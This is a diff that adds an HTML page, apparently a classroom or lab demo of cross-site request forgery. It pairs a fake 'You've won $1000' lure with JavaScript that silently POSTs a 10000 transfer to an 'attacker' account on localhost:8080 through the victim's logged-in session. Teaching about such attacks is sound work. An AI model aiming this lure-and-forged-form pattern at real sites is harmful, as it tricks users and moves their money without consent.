@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack Demo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 20px;
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+        }
+        .attack-box {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+        h2 {
+            color: #d32f2f;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 18px;
+            margin-bottom: 30px;
+        }
+        button {
+            padding: 15px 30px;
+            background: linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%);
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 18px;
+            cursor: pointer;
+            box-shadow: 0 3px 5px 2px rgba(255, 105, 135, .3);
+            font-weight: bold;
+        }
+        button:hover {
+            transform: scale(1.05);
+        }
+        .warning {
+            background: #fff3cd;
+            padding: 15px;
+            border-radius: 4px;
+            margin-top: 20px;
+            color: #856404;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="attack-box">
+        <h2>🎁 Click Below to Claim Your Reward!</h2>
+        <p><strong>Congratulations!</strong> You've won $1000!</p>
+        <button onclick="claimReward()">Claim My Money</button>
+        
+        <div class="warning">
+            ⚠️ <strong>CSRF Attack Demo:</strong> When you click this button, it will transfer money from your authenticated session on localhost:8080 to the attacker's account!
+        </div>
+    </div>
+
+    <script>
+        function claimReward() {
+            // CSRF Attack: Submits a form to transfer money using the victim's authenticated session
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'http://localhost:8080/csrf/transfer';
+            
+            const amountInput = document.createElement('input');
+            amountInput.type = 'hidden';
+            amountInput.name = 'amount';
+            amountInput.value = '10000';
+            form.appendChild(amountInput);
+            
+            const toInput = document.createElement('input');
+            toInput.type = 'hidden';
+            toInput.name = 'to';
+            toInput.value = 'attacker';
+            form.appendChild(toInput);
+            
+            document.body.appendChild(form);
+            form.submit();
+        }
+    </script>
+</body>
+</html>
+
